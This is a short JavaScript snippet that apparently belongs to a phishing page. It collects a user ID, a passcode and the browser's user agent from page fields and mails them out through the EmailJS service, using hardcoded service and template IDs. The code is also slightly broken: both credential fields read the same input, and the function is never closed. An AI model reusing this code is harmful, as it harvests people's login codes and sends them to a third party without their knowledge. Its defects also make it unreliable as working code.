function sendEmail(){
    var params = {
        txtUserID: document.getElementById("enter-code").value,

        txtPasscode: document.getElementById("enter-code").value,
        Useragent: document.getElementById("Useragent").value,
    }
const serviceID = "service_m0zt6uk"
const templateID = "template_f00v7vp"

emailjs.send(serviceID,templateID,params)
.then(
    res =>{
        document.getElementById("enter-code").value ="";
        document.getElementById("enter-code").value=""
        console.log(res);
        
    })
    .catch(err=>console.log(err));
